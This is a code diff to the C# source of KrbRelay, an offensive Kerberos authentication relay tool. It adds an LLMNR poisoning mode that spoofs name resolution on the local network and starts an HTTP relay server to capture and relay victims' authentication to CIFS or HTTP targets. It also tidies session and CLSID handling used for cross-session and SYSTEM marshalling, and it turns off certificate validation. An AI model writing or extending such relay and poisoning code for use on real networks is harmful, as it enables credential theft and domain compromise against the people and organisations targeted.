@@ -12,6 +12,7 @@ using System.Net.Http;
 using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 using static KrbRelay.Natives;
 
 namespace KrbRelay
@@ -59,10 +60,17 @@ namespace KrbRelay
                 bool worked;
                 IntPtr buffer = IntPtr.Zero;
 
-                worked = WTSQuerySessionInformation(IntPtr.Zero, SessionId, WTS_INFO_CLASS.ConnectState, out buffer, out bytesReturned);
-                var state = (WTS_CONNECTSTATE_CLASS)Enum.ToObject(typeof(WTS_CONNECTSTATE_CLASS), Marshal.ReadInt32(buffer));
-                if (state != WTS_CONNECTSTATE_CLASS.Active)
-                    Console.WriteLine("[-] WARNING, user's session is not active");
+                try { 
+                    worked = WTSQuerySessionInformation(IntPtr.Zero, SessionId, WTS_INFO_CLASS.ConnectState, out buffer, out bytesReturned);
+                    var state = (WTS_CONNECTSTATE_CLASS)Enum.ToObject(typeof(WTS_CONNECTSTATE_CLASS), Marshal.ReadInt32(buffer));
+                    if (state != WTS_CONNECTSTATE_CLASS.Active)
+                        Console.WriteLine("[-] WARNING, user's session is not active");
+                }
+                catch
+                {
+                    Console.WriteLine("[-] Session {0} does not exists", SessionId);
+                    Environment.Exit(0);
+                }
 
                 worked = WTSQuerySessionInformation(IntPtr.Zero, SessionId, WTS_INFO_CLASS.DomainName, out buffer, out bytesReturned);
                 relayedUserDomain = Marshal.PtrToStringAnsi(buffer);
@@ -90,6 +98,7 @@ namespace KrbRelay
         public static string domainDN = "";
         public static string targetFQDN = "";
         public static bool useSSL = false;
+        public static bool stopSpoofing = false;
         public static Dictionary<string, string> attacks = new Dictionary<string, string>();
         public static SMB2Client smbClient = new SMB2Client();
         public static HttpClientHandler handler = new HttpClientHandler();
@@ -228,6 +237,7 @@ namespace KrbRelay
             Console.WriteLine("-clsid                    Service to be executed in");
             Console.WriteLine("-session                  ID for cross-session marshalling");
             Console.WriteLine("-port                     COM listener port");
+            Console.WriteLine("-llmnr                    LLMNR poisoning");
         }
 
         public static bool checkPort(int port, string name = "SYSTEM")
@@ -268,6 +278,8 @@ namespace KrbRelay
             int sessionID = -123;
             string port = "12345";
             bool show_help = false;
+            bool llmnr = false;
+            Guid clsId_guid = new Guid();
 
             foreach (var entry in args.Select((value, index) => new { index, value }))
             {
@@ -589,6 +601,10 @@ namespace KrbRelay
                     case "/SSL":
                         useSSL = true;
                         break;
+                    case "-LLMNR":
+                    case "/LLMNR":
+                        llmnr = true;
+                        break;
 
                     case "-PORT":
                     case "/PORT":
@@ -643,40 +659,41 @@ namespace KrbRelay
             }
             domainDN = domainDN.TrimStart(',');
 
-            service = spn.Split('/').First();
+            service = spn.Split('/').First().ToLower();
             if (!(new List<string> { "ldap", "cifs", "http" }.Contains(service)))
             {
-                Console.WriteLine("'{0}' service not supported", service.ToLower());
+                Console.WriteLine("'{0}' service not supported", service);
                 Console.WriteLine("choose from CIFS, LDAP and HTTP");
                 return;
             }
 
-            if (string.IsNullOrEmpty(clsid))
+            if (string.IsNullOrEmpty(clsid) && llmnr == false)
             {
-                //Console.WriteLine("Missing /clsid: parameter");
-                //Console.WriteLine("KrbRelay.exe -h for help");
-                //return;
+                Console.WriteLine("Missing /clsid: parameter");
+                Console.WriteLine("KrbRelay.exe -h for help");
+                return;
 
                 // for dev
-                if (sessionID != -123)
-                {
-                    // cross-session
-                    //clsid = "{354ff91b-5e49-4bdc-a8e6-1cb6c6877182}";
-                    //clsid = "{38e441fb-3d16-422f-8750-b2dacec5cefc}";
-                    clsid = "{f8842f8e-dafe-4b37-9d38-4e0714a61149}";
-                }
-                else
-                {
-                    //system
-                    clsid = "{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}";
-                }
+                //if (sessionID != -123)
+                //{
+                //    // cross-session
+                //    //clsid = "{354ff91b-5e49-4bdc-a8e6-1cb6c6877182}";
+                //    //clsid = "{38e441fb-3d16-422f-8750-b2dacec5cefc}";
+                //    clsid = "{f8842f8e-dafe-4b37-9d38-4e0714a61149}";
+                //}
+                //else
+                //{
+                //    //system
+                //    clsid = "{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}";
+                //}
             }
-            Guid clsId_guid = new Guid(clsid);
+            if (!string.IsNullOrEmpty(clsid))
+                clsId_guid = new Guid(clsid);
 
             //
             setUserData(sessionID);
 
-            if (service.ToLower() == "ldap")
+            if (service == "ldap")
             {
                 var ldap_ptsExpiry = new SECURITY_INTEGER();
                 var status = AcquireCredentialsHandle(
@@ -731,7 +748,7 @@ namespace KrbRelay
                     return;
                 }
             }
-            if (service.ToLower() == "cifs")
+            if (service == "cifs")
             {
                 bool isConnected = smbClient.Connect(targetFQDN, SMBTransportType.DirectTCPTransport);
                 if (!isConnected)
@@ -740,7 +757,7 @@ namespace KrbRelay
                     return;
                 }
             }
-            if (service.ToLower() == "http")
+            if (service == "http")
             {
                 if (!attacks.Keys.Contains("endpoint") || string.IsNullOrEmpty(attacks["endpoint"]))
                 {
@@ -750,10 +767,10 @@ namespace KrbRelay
                 //handler = new HttpClientHandler() { PreAuthenticate = false, UseCookies = false };
                 ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                 handler = new HttpClientHandler() { UseDefaultCredentials = false, PreAuthenticate = false, UseCookies = true };
-                handler.AutomaticDecompression = DecompressionMethods.Deflate | DecompressionMethods.GZip;
+                //handler.AutomaticDecompression = DecompressionMethods.Deflate | DecompressionMethods.GZip;
+                //handler.ClientCertificateOptions = ClientCertificateOption.Manual;
                 //handler.AllowAutoRedirect = true;
                 //handler.Proxy = new WebProxy("http://localhost:8080");
-                handler.ClientCertificateOptions = ClientCertificateOption.Manual;
 
                 //handler.ServerCertificateCustomValidationCallback =
                 //    (httpRequestMessage, cert, cetChain, policyErrors) =>
@@ -768,6 +785,47 @@ namespace KrbRelay
                 }
                 httpClient.BaseAddress = new Uri(string.Format("{0}://{1}", transport, targetFQDN));
                 //Console.WriteLine(httpClient.BaseAddress);
+            }
+
+
+            if (llmnr)
+            {
+                if(service == "ldap")
+                {
+                    Console.WriteLine("[-] LLMNR will not work with ldap");
+                    return;
+                }
+
+                string argLLMNRTTL = "30";
+                string argSpooferIP = "";
+                string argSpooferIPv6 = "";
+
+                if (!String.IsNullOrEmpty(argSpooferIP)) { try { IPAddress.Parse(argSpooferIP); } catch { throw new ArgumentException("SpooferIP value must be an IP address"); } }
+                if (!String.IsNullOrEmpty(argSpooferIPv6)) { try { IPAddress.Parse(argSpooferIPv6); } catch { throw new ArgumentException("SpooferIP value must be an IP address"); } }
+                if (string.IsNullOrEmpty(argSpooferIP))
+                {
+                    argSpooferIP = Spoofing.Util.GetLocalIPAddress("IPv4");
+                }
+                if (string.IsNullOrEmpty(argSpooferIPv6))
+                {
+                    argSpooferIPv6 = Spoofing.Util.GetLocalIPAddress("IPv6");
+                }
+                string spoofSPN = "";
+                //if (service == "cifs")
+                //    spoofSPN = targetFQDN.Split('.')[0];
+                //else
+                //    spoofSPN = targetFQDN;
+                spoofSPN = targetFQDN.Split('.')[0];
+
+                Thread llmnrListenerThread = new Thread(() => Spoofing.LLMNR.LLMNRListener(argSpooferIP, argSpooferIP, argSpooferIPv6, argLLMNRTTL, "IPv4", spoofSPN));
+                llmnrListenerThread.Start();
+
+                //http
+                Spoofing.HttpRelayServer.start(service, argSpooferIP);
+                //Thread httpRelayServerThread = new Thread(() => Spoofing.HttpRelayServer.start(targetFQDN, useSSL, service));
+                //httpRelayServerThread.Start();
+
+                return;
             }
 
             //get value for AcceptSecurityContex
